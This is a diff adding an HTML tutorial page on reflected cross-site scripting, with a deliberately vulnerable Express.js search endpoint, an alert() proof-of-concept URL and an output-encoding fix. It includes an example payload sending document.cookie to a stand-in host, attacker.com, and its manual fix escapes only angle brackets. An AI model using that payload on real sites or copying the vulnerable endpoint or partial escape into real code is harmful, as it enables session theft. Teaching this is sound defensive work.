@@ -1,0 +1,364 @@
+<!DOCTYPE html>
+<html lang="en">
+  <head>
+    <meta charset="UTF-8" />
+    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
+    <title>Reflected XSS Deep Dive & Express Demo</title>
+    <link
+      href="https://fonts.googleapis.com/css2?family=Nunito:wght@300;400;700&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      /* General Theme and Font */
+      body {
+        font-family: 'Nunito', sans-serif;
+        background-color: #1e1e1e; /* VS Code dark background */
+        color: #d4d4d4; /* Light text color */
+        line-height: 1.6;
+        margin: 0;
+        padding: 20px;
+      }
+
+      .container {
+        max-width: 900px;
+        margin: 0 auto;
+        background-color: #252526; /* Slightly lighter panel background */
+        padding: 30px;
+        border-radius: 8px;
+        box-shadow: 0 4px 12px rgba(0, 0, 0, 0.5);
+      }
+
+      /* Headings */
+      h1,
+      h2,
+      h3,
+      h4 {
+        font-weight: 700;
+        margin-top: 25px;
+        padding-bottom: 5px;
+      }
+
+      h1 {
+        color: #569cd6; /* VS Code blue for main title */
+        font-size: 2em;
+        border-bottom: 2px solid #3c3c3c;
+      }
+
+      h2 {
+        font-size: 1.5em;
+        color: #4ec9b0; /* Teal/Cyan color for main sections */
+        border-bottom: 1px dashed #3c3c3c;
+      }
+
+      h3 {
+        font-size: 1.2em;
+        color: #ff9d00; /* Orange/Yellow for subsections */
+        margin-bottom: 10px;
+      }
+
+      h4 {
+        font-size: 1.1em;
+        color: #c586c0; /* Purple for code/demo headers */
+      }
+
+      p {
+        margin-bottom: 15px;
+      }
+
+      strong {
+        color: #ff9d00;
+      }
+
+      /* Lists */
+      ol {
+        padding-left: 20px;
+      }
+
+      li {
+        margin-bottom: 10px;
+      }
+
+      /* Code Block Styling (VS Code Dark Theme) */
+      .code-section {
+        background-color: #1e1e1e;
+        padding: 15px;
+        border-radius: 6px;
+        overflow-x: auto;
+        margin: 15px 0;
+        border: 1px solid #3c3c3c;
+      }
+
+      .code-section pre {
+        margin: 0;
+        font-family: 'Consolas', 'Courier New', monospace;
+        font-size: 0.9em;
+      }
+
+      /* Code Syntax Highlighting Imitation */
+      .keyword {
+        color: #569cd6;
+      } /* blue */
+      .import {
+        color: #c586c0;
+      } /* purple */
+      .variable {
+        color: #9cdcfe;
+      } /* light blue */
+      .string {
+        color: #ce9178;
+      } /* orange/brown */
+      .comment {
+        color: #6a9955;
+      } /* green */
+      .function {
+        color: #dcdcaa;
+      } /* yellow */
+      .tag {
+        color: #569cd6;
+      } /* HTML tags */
+      .html-text {
+        color: #ce9178;
+      } /* HTML string content */
+      .attribute {
+        color: #9cdcfe;
+      } /* HTML attributes */
+    </style>
+  </head>
+  <body>
+    <div class="container">
+      <h1>Reflected XSS Deep Dive & Express Demo</h1>
+      <p>
+        **Reflected XSS** is a common and **high-risk vulnerability** that
+        occurs when a web application takes user input from an HTTP request
+        (like a URL parameter) and immediately includes it **unsanitized** in
+        the web page response. The payload is not stored on the server but
+        **"reflected"** back to the user's browser, where it executes.
+      </p>
+      <p>
+        Here is a deep dive into how Reflected XSS works, followed by a
+        practical demonstration using Express.js.
+      </p>
+
+      <h2><span style="color: #4ec9b0">🔄</span> How Reflected XSS Works</h2>
+      <p>
+        The core mechanism of Reflected XSS relies on a victim being tricked
+        into clicking a malicious link containing the attack payload.
+      </p>
+
+      <ol>
+        <li>
+          <h3>Vulnerable Application Feature:</h3>
+          <p>
+            The attacker identifies a feature on a website that takes user input
+            from the URL (usually a query parameter) and reflects it back on the
+            page. A common example is a search page that displays the search
+            term entered, or an error page that displays the missing filename.
+          </p>
+        </li>
+        <li>
+          <h3>Payload Crafting:</h3>
+          <p>
+            The attacker injects a malicious script into the vulnerable URL
+            parameter.
+          </p>
+          <p><strong>Example Payload:</strong></p>
+          <div class="code-section">
+            <pre><span class="string">https://example.com/search?query=</span><span class="tag">&lt;script&gt;</span><span class="function">document</span>.<span class="variable">location</span>=<span class="string">'http://attacker.com/steal.php?c=' + document.cookie</span>;<span class="tag">&lt;/script&gt;</span></pre>
+          </div>
+        </li>
+        <li>
+          <h3>Delivery (Social Engineering):</h3>
+          <p>
+            The attacker sends this specially crafted link to a victim, often
+            disguised as a legitimate link in an email or social media message
+            (e.g., "Check out this amazing discount!").
+          </p>
+        </li>
+        <li>
+          <h3>Execution:</h3>
+          <ul>
+            <li>The victim clicks the link.</li>
+            <li>
+              The victim's browser sends the request, including the malicious
+              script, to the server.
+            </li>
+            <li>
+              The server, running the vulnerable code, takes the
+              <span class="tag">&lt;script&gt;</span> payload and inserts it
+              directly into the HTML response.
+            </li>
+            <li>
+              The browser receives the HTML response, parses it, and executes
+              the malicious script embedded within the HTML.
+            </li>
+            <li>
+              The script executes, stealing the victim's session cookie and
+              sending it to the attacker's server (<span class="code-inline"
+                >http://attacker.com/steal.php</span
+              >).
+            </li>
+          </ul>
+        </li>
+      </ol>
+
+      <h2>
+        <span style="color: #ff9d00">🛠️</span> Practical Demonstration with
+        Express.js
+      </h2>
+      <p>
+        We can demonstrate this attack using a vulnerable Express application
+        setup.
+      </p>
+
+      <h3>1. The Vulnerable Express Server</h3>
+      <p>
+        This code sets up a simple search endpoint that is vulnerable to
+        Reflected XSS because it trusts and reflects the
+        <span class="variable">term</span> parameter directly into the HTML
+        response.
+      </p>
+      <h4>Server File: <span class="variable">vulnerable_app.js</span></h4>
+
+      <div class="code-section">
+        <pre>
+<span class="comment">// Install required packages: npm install express</span>
+<span class="import">import</span> <span class="variable">express</span> <span class="keyword">from</span> <span class="string">'express'</span>;
+<span class="keyword">const</span> <span class="variable">app</span> <span class="keyword">=</span> <span class="function">express</span>();
+<span class="keyword">const</span> <span class="variable">port</span> <span class="keyword">=</span> <span class="function">3000</span>;
+
+<span class="variable">app</span>.<span class="function">get</span>(<span class="string">'/search'</span>, <span class="function">(<span class="variable">req</span>, <span class="variable">res</span>) =></span> {
+    <span class="comment">// 1. Get user input directly from the query parameter</span>
+    <span class="keyword">const</span> <span class="variable">searchTerm</span> <span class="keyword">=</span> <span class="variable">req</span>.<span class="variable">query</span>.<span class="variable">term</span> <span class="keyword">||</span> <span class="string">'No term specified'</span>;
+
+    <span class="comment">// 2. VULNERABLE STEP: Injecting user input directly into the HTML response</span>
+    <span class="comment">// The server trusts that 'searchTerm' is just text, but it could be HTML/JavaScript.</span>
+    <span class="keyword">const</span> <span class="variable">htmlResponse</span> <span class="keyword">=</span> <span class="string">`
+        &lt;!DOCTYPE html&gt;
+        &lt;html&gt;
+        &lt;head&gt;&lt;title&gt;Search Results&lt;/title&gt;&lt;/head&gt;
+        &lt;body&gt;
+            &lt;h2&gt;Search Results&lt;/h2&gt;
+            &lt;p&gt;You searched for: &lt;strong&gt;${</span><span class="variable">searchTerm</span>}<span class="string">&lt;/strong&gt;&lt;/p&gt;
+            &lt;hr&gt;
+            &lt;p&gt;0 results found.&lt;/p&gt;
+        &lt;/body&gt;
+        &lt;/html&gt;
+    `</span>;
+    
+    <span class="comment">// 3. Reflect the response back to the browser</span>
+    <span class="variable">res</span>.<span class="function">send</span>(<span class="variable">htmlResponse</span>);
+});
+
+<span class="variable">app</span>.<span class="function">listen</span>(<span class="variable">port</span>, <span class="function">() =></span> {
+    <span class="function">console</span>.<span class="function">log</span>(<span class="string">`Vulnerable app listening at http://localhost:${port}`</span>);
+});
+            </pre>
+      </div>
+
+      <h3>2. Execution of the Attack</h3>
+      <p>
+        Run the server: <span class="code-inline">node vulnerable_app.js</span>
+      </p>
+
+      <h4>A. Harmless Test (Expected Behavior)</h4>
+      <p>If a user performs a normal search, the output is harmless text:</p>
+      <p>
+        <strong>URL:</strong>
+        <span class="code-inline"
+          >http://localhost:3000/search?term=apple+pie</span
+        >
+      </p>
+      <p><strong>Output HTML (on victim's browser):</strong></p>
+      <div class="code-section">
+        <pre><span class="tag">&lt;p&gt;</span><span class="html-text">You searched for: </span><span class="tag">&lt;strong&gt;</span><span class="html-text">apple pie</span><span class="tag">&lt;/strong&gt;&lt;/p&gt;</span></pre>
+      </div>
+
+      <h4>B. The Malicious Attack (Reflected XSS)</h4>
+      <p>
+        The attacker crafts a malicious URL containing a JavaScript payload.
+        We'll use a simple <span class="function">alert()</span> for
+        demonstration.
+      </p>
+      <p><strong>Malicious URL (Attacker's link):</strong></p>
+      <div class="code-section">
+        <pre><span class="string">http://localhost:3000/search?term=</span><span class="tag">&lt;script&gt;</span><span class="function">alert</span>(<span class="string">'XSS_ATTACK_SUCCESSFUL'</span>)<span class="tag">&lt;/script&gt;</span></pre>
+      </div>
+
+      <p><strong>Vulnerable Output HTML (on victim's browser):</strong></p>
+      <div class="code-section">
+        <pre>
+...<span class="tag">&lt;p&gt;</span><span class="html-text">You searched for: </span><span class="tag">&lt;strong&gt;</span><span class="tag">&lt;script&gt;</span><span class="function">alert</span>(<span class="string">'XSS_ATTACK_SUCCESSFUL'</span>)<span class="tag">&lt;/script&gt;</span><span class="tag">&lt;/strong&gt;&lt;/p&gt;</span>
+...
+            </pre>
+      </div>
+      <p>
+        The victim's browser executes the embedded
+        <span class="tag">&lt;script&gt;</span> tag, and a pop-up alert appears.
+        In a real-world scenario, this script would secretly steal session
+        tokens, credentials, or redirect the user to a phishing site.
+      </p>
+
+      <h2>
+        <span style="color: #4ec9b0">✅</span> The Fix: Input Sanitization
+      </h2>
+      <p>
+        The solution to Reflected XSS is to ensure that user input is **always
+        output-encoded** before being rendered on the page, transforming any
+        potentially dangerous characters (<span class="code-inline">&lt;</span>,
+        <span class="code-inline">&gt;</span>,
+        <span class="code-inline">"</span>, etc.) into their safe, literal HTML
+        entities (<span class="code-inline">&amp;lt;</span>,
+        <span class="code-inline">&amp;gt;</span>,
+        <span class="code-inline">&amp;quot;</span>).
+      </p>
+      <p>
+        Using the Node example above, the fix involves simply escaping the
+        output:
+      </p>
+
+      <div class="code-section">
+        <pre>
+<span class="comment">// The fix: HTML-encode the output before rendering.</span>
+<span class="comment">// In a real app, use a library like 'he' (HTML Entity Encoder)</span>
+<span class="import">import</span> <span class="variable">he</span> <span class="keyword">from</span> <span class="string">'he'</span>;
+<span class="comment">// const safeSearchTerm = he.encode(searchTerm); // Use this line in a real app</span>
+
+<span class="comment">// For this example, we'll manually escape the two most dangerous characters:</span>
+<span class="keyword">const</span> <span class="variable">safeSearchTerm</span> <span class="keyword">=</span> <span class="variable">searchTerm</span>.<span class="function">replace</span>(<span class="variable">/&lt;/g</span>, <span class="string">'&amp;lt;'</span>).<span class="function">replace</span>(<span class="variable">/&gt;/g</span>, <span class="string">'&amp;gt;'</span>);
+
+<span class="keyword">const</span> <span class="variable">safeHtmlResponse</span> <span class="keyword">=</span> <span class="string">`
+    &lt;!DOCTYPE html&gt;
+    &lt;html&gt;
+    &lt;head&gt;&lt;title&gt;Search Results&lt;/title&gt;&lt;/head&gt;
+    &lt;body&gt;
+        &lt;h2&gt;Search Results&lt;/h2&gt;
+        &lt;p&gt;You searched for: &lt;strong&gt;${</span><span class="variable">safeSearchTerm</span>}<span class="string">&lt;/strong&gt;&lt;/p&gt;
+        &lt;hr&gt;
+        &lt;p&gt;0 results found.&lt;/p&gt;
+    &lt;/body&gt;
+    &lt;/html&gt;
+`</span>;
+
+<span class="variable">res</span>.<span class="function">send</span>(<span class="variable">safeHtmlResponse</span>);
+            </pre>
+      </div>
+
+      <p><strong>Result of the fix:</strong></p>
+      <p>When the malicious URL is visited, the output is now safe text:</p>
+
+      <div class="code-section">
+        <pre>
+...<span class="tag">&lt;p&gt;</span><span class="html-text">You searched for: </span><span class="tag">&lt;strong&gt;</span><span class="html-text">&amp;lt;script&gt;alert('XSS_ATTACK_SUCCESSFUL')&amp;lt;/script&gt;</span><span class="tag">&lt;/strong&gt;&lt;/p&gt;</span>
+...
+            </pre>
+      </div>
+      <p>
+        The browser now displays the text
+        <span class="code-inline"
+          >&lt;script&gt;alert('XSS_ATTACK_SUCCESSFUL')&lt;/script&gt;</span
+        >
+        literally, without executing it.
+      </p>
+    </div>
+  </body>
+</html>
